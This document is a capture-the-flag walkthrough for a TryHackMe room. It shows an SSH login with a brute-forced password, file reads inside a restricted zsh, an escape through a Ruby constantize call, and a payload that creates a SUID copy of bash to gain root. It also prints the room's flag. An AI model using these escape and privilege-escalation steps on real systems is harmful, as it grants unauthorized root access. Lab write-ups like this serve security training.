# 86 - Red Stone One Carat (Restricted Shell Escape with RUBY)

Room Link --> [https://tryhackme.com/room/redstoneonecarat](https://tryhackme.com/room/redstoneonecarat)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap 10.10.203.226 -Pn -n -vvv -T4

22/tcp open  ssh     syn-ack
```
{% endcode %}

Start with SSH bruteforce on user `noraj`.

```
login: noraj   password: cheeseburger
```

Quickly, we noticed that the usual commands did not work or were restricted, and that the echo command did work.

### Restricted Shell

We thought of a restricted shell, to confirm this we used the command `echo $SHELL`.

```bash
red-stone-one-carat% echo $SHELL
/bin/rzsh
```

Which confirms our suspicions, we are dealing with a restricted shell.

We list all files using echo.

{% code overflow="wrap" %}
```bash
red-stone-one-carat% echo ./*
./bin ./user.txt

# or
red-stone-one-carat% echo * .*
bin user.txt .cache .hint.txt .zcompdump.red-stone-one-carat.1575 .zcompdump.red-stone-one-carat.1786 .zshrc

# ls dir
red-stone-one-carat% echo bin/*
bin/rzsh bin/test.rb
```
{% endcode %}

Cat content of a file with echo or printf

```bash
red-stone-one-carat% echo "$(<user.txt)"
THM{3a106092635945849a0fbf7bac92409d}

red-stone-one-carat% printf "%s" "$(<user.txt)"
THM{3a106092635945849a0fbf7bac92409d}

red-stone-one-carat% echo "$(<bin/test.rb)"
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
    klass = ARGV[0].constantize
    obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
    puts File.read(__FILE__)
end
```

### Priv Esc

We can view the `.hint.txt` file.

```bash
red-stone-one-carat% echo "$(<.hint.txt)"
Maybe take a look at local services.
```

After analysis of the script and research we discovered a way to exploit this script to execute system commands. This exploitation is possible thanks to the method `constantize`which is a dangerous method. We can now escape the restricted shell with the command&#x20;

`test.rb Kernel 'system' "/bin/zsh"`

We also need to import the PATH to be able to load the commands&#x20;

`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`.

Now, we tried to consult local services without success, but with this new shell the **ruby** ​​command works. We then thought of an alternative in ruby ​​to see local services and we came across this [netstat.rb](https://gist.githubusercontent.com/kwilczynski/954046/raw/4571a1eed62c4f13d0a2c70c5cf5ebd45e41004e/netstat.rb) file.

Donwload it to kali and transfer it to the victim box using scp or base64.

I used Base64

{% code overflow="wrap" lineNumbers="true" %}
```bash
# encoding it with base64 without any new line character.
dking@dking ~/Downloads$ cat netstat.rb| base64 -w 0                                                        
ISMvdXNyL2Jpbi9lbnYgcnVieQoKUFJPQ19ORVRfVENQID0gJy9wcm9jL25ldC90Y3AnICAjIFRoaXMgc2hvdWxkIGFsd2F5cyBiZSB0aGUgc2FtZSAuLi4KClRDUF9TVEFURVMgPSB7ICcwMCcgPT4gJ1VOS05PV04nLCAgIyBCYWQgc3RhdGUgLi4uIEltcG9zc2libGUgdG8gYWNoaWV2ZSAuLi4KICAgICAgICAgICAgICAgJ0ZGJyA9PiAnVU5LTk9XTicsICAjIEJhZCBzdGF0ZSAuLi4gSW1wb3NzaWJsZSB0byBhY2hpZXZlIC4uLgogICAgICAgICAgICAgICAnMDEnID0+ICdFU1RBQkxJU0hFRCcsCiAgICAgICAgICAgICAgICcwMicgPT4gJ1NZTl9TRU5UJywKICAgICAgICAgICAgICAgJzAzJyA9PiAnU1lOX1JFQ1YnLAogICAgICAgICAgICAgICAnMDQnID0+ICdGSU5fV0FJVDEnLAogICAgICAgICAgICAgICAnMDUnID0+ICdGSU5fV0FJVDInLAogICAgICAgICAgICAgICAnMDYnID0+ICdUSU1FX1dBSVQnLAogICAgICAgICAgICAgICAnMDcnID0+ICdDTE9TRScsCiAgICAgICAgICAgICAgICcwOCcgPT4gJ0NMT1NFX1dBSVQnLAogICAgICAgICAgICAgICAnMDknID0+ICdMQVNUX0FDSycsCiAgICAgICAgICAgICAgICcwQScgPT4gJ0xJU1RFTicsCiAgICAgICAgICAgICAgICcwQicgPT4gJ0NMT1NJTkcnIH0gIyBOb3QgYSB2YWxpZCBzdGF0ZSAuLi4KCmlmICQwID09IF9fRklMRV9fCgogIFNURE9VVC5zeW5jID0gdHJ1ZQogIFNUREVSUi5zeW5jID0gdHJ1ZQoKICBGaWxlLm9wZW4oUFJPQ19ORVRfVENQKS5lYWNoIGRvIHxpfAoKICAgIGkgPSBpLnN0cmlwCgogICAgbmV4dCB1bmxlc3MgaS5tYXRjaCgvXlxkKy8pCgogICAgaSA9IGkuc3BsaXQoJyAnKQoKICAgIGxvY2FsLCByZW1vdGUsIHN0YXRlID0gaS52YWx1ZXNfYXQoMSwgMiwgMykKCiAgICBsb2NhbF9JUCwgbG9jYWxfcG9ydCAgID0gbG9jYWwuc3BsaXQoJzonKS5jb2xsZWN0IHsgfGl8IGkudG9faSgxNikgfQogICAgcmVtb3RlX0lQLCByZW1vdGVfcG9ydCA9IHJlbW90ZS5zcGxpdCgnOicpLmNvbGxlY3QgeyB8aXwgaS50b19pKDE2KSB9CgogICAgY29ubmVjdGlvbl9zdGF0ZSA9IFRDUF9TVEFURVMuZmV0Y2goc3RhdGUpCgogICAgbG9jYWxfSVAgID0gW2xvY2FsX0lQXS5wYWNrKCdOJykudW5wYWNrKCdDNCcpLnJldmVyc2Uuam9pbignLicpCiAgICByZW1vdGVfSVAgPSBbcmVtb3RlX0lQXS5wYWNrKCdOJykudW5wYWNrKCdDNCcpLnJldmVyc2Uuam9pbignLicpCgogICAgICBwdXRzICIje2xvY2FsX0lQfToje2xvY2FsX3BvcnR9ICIgKwogICAgICAgICIje3JlbW90ZV9JUH06I3tyZW1vdGVfcG9ydH0gI3tjb25uZWN0aW9uX3N0YXRlfSIKICBlbmQKCiAgZXhpdCgwKQplbmQ=
```
{% endcode %}

On the victim.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# save the decoded text into netstat.rb
red-stone-one-carat% echo 'ISMvdXNyL2Jpbi9lbnYgcnVieQoKUFJPQ19ORVRfVENQID0gJy9wcm9jL25ldC90Y3AnICAjIFRoaXMgc2hvdWxkIGFsd2F5cyBiZSB0aGUgc2FtZSAuLi4KClRDUF9TVEFURVMgPSB7ICcwMCcgPT4gJ1VOS05PV04nLCAgIyBCYWQgc3RhdGUgLi4uIEltcG9zc2libGUgdG8gYWNoaWV2ZSAuLi4KICAgICAgICAgICAgICAgJ0ZGJyA9PiAnVU5LTk9XTicsICAjIEJhZCBzdGF0ZSAuLi4gSW1wb3NzaWJsZSB0byBhY2hpZXZlIC4uLgogICAgICAgICAgICAgICAnMDEnID0+ICdFU1RBQkxJU0hFRCcsCiAgICAgICAgICAgICAgICcwMicgPT4gJ1NZTl9TRU5UJywKICAgICAgICAgICAgICAgJzAzJyA9PiAnU1lOX1JFQ1YnLAogICAgICAgICAgICAgICAnMDQnID0+ICdGSU5fV0FJVDEnLAogICAgICAgICAgICAgICAnMDUnID0+ICdGSU5fV0FJVDInLAogICAgICAgICAgICAgICAnMDYnID0+ICdUSU1FX1dBSVQnLAogICAgICAgICAgICAgICAnMDcnID0+ICdDTE9TRScsCiAgICAgICAgICAgICAgICcwOCcgPT4gJ0NMT1NFX1dBSVQnLAogICAgICAgICAgICAgICAnMDknID0+ICdMQVNUX0FDSycsCiAgICAgICAgICAgICAgICcwQScgPT4gJ0xJU1RFTicsCiAgICAgICAgICAgICAgICcwQicgPT4gJ0NMT1NJTkcnIH0gIyBOb3QgYSB2YWxpZCBzdGF0ZSAuLi4KCmlmICQwID09IF9fRklMRV9fCgogIFNURE9VVC5zeW5jID0gdHJ1ZQogIFNUREVSUi5zeW5jID0gdHJ1ZQoKICBGaWxlLm9wZW4oUFJPQ19ORVRfVENQKS5lYWNoIGRvIHxpfAoKICAgIGkgPSBpLnN0cmlwCgogICAgbmV4dCB1bmxlc3MgaS5tYXRjaCgvXlxkKy8pCgogICAgaSA9IGkuc3BsaXQoJyAnKQoKICAgIGxvY2FsLCByZW1vdGUsIHN0YXRlID0gaS52YWx1ZXNfYXQoMSwgMiwgMykKCiAgICBsb2NhbF9JUCwgbG9jYWxfcG9ydCAgID0gbG9jYWwuc3BsaXQoJzonKS5jb2xsZWN0IHsgfGl8IGkudG9faSgxNikgfQogICAgcmVtb3RlX0lQLCByZW1vdGVfcG9ydCA9IHJlbW90ZS5zcGxpdCgnOicpLmNvbGxlY3QgeyB8aXwgaS50b19pKDE2KSB9CgogICAgY29ubmVjdGlvbl9zdGF0ZSA9IFRDUF9TVEFURVMuZmV0Y2goc3RhdGUpCgogICAgbG9jYWxfSVAgID0gW2xvY2FsX0lQXS5wYWNrKCdOJykudW5wYWNrKCdDNCcpLnJldmVyc2Uuam9pbignLicpCiAgICByZW1vdGVfSVAgPSBbcmVtb3RlX0lQXS5wYWNrKCdOJykudW5wYWNrKCdDNCcpLnJldmVyc2Uuam9pbignLicpCgogICAgICBwdXRzICIje2xvY2FsX0lQfToje2xvY2FsX3BvcnR9ICIgKwogICAgICAgICIje3JlbW90ZV9JUH06I3tyZW1vdGVfcG9ydH0gI3tjb25uZWN0aW9uX3N0YXRlfSIKICBlbmQKCiAgZXhpdCgwKQplbmQ=' | base64 -d > netstat.rb
```
{% endcode %}

Now we can run `ruby netstat.rb`to find local services.

```bash
red-stone-one-carat% ruby netstat.rb 
127.0.0.53:53 0.0.0.0:0 LISTEN
0.0.0.0:22 0.0.0.0:0 LISTEN
127.0.0.1:31547 0.0.0.0:0 LISTEN
10.10.203.226:22 10.18.88.214:35166 ESTABLISHED
red-stone-one-carat% 
```

The port is in listening mode **`31547`**, we start listening with the command `nc 127.0.0.1 31547`and we have a new shell.

We tried running the usual commands without success, it looks like we are in a ruby ​​restricted shell again. After some searching, we found a payload that copies bash into the /tmp directory and appends a suid to it.

```bash
red-stone-one-carat% nc 127.0.0.1 31547
$ id
undefined local variable or method `id' for main:Object
$ exec %q!cp /bin/bash /tmp/bash; chmod +s /tmp/bash!                                                                            
red-stone-one-carat% whoami
noraj
red-stone-one-carat% /tmp/bash -p
bash-4.4# id
uid=1001(noraj) gid=1001(noraj) euid=0(root) egid=0(root) groups=0(root),1001(noraj)
bash-4.4# 
```

Done!

